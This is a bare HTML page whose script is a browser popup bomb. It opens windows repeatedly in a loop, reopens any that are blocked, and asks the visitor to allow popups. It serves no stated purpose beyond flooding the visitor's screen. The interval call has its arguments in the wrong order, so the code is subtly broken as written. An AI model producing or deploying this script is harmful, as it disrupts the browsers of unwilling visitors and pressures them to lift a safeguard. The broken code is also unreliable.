<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">
        <title></title>
    </head>
    <body>
        <script type="text/javascript">
            var windows = [];
            var open = window.open(".");
            if(open){
                setInterval(1, function(){
                    for(var i = 0; i < 5; i ++){
                        windows.push(window.open("."));
                    }
                    for(var i in windows){
                        if(!windows[i]){
                            window.open(".");
                            window.open(".");
                        }
                    }
                });
            } else {
                alert("Please allow popups")
            }
        </script>
    </body>
</html>
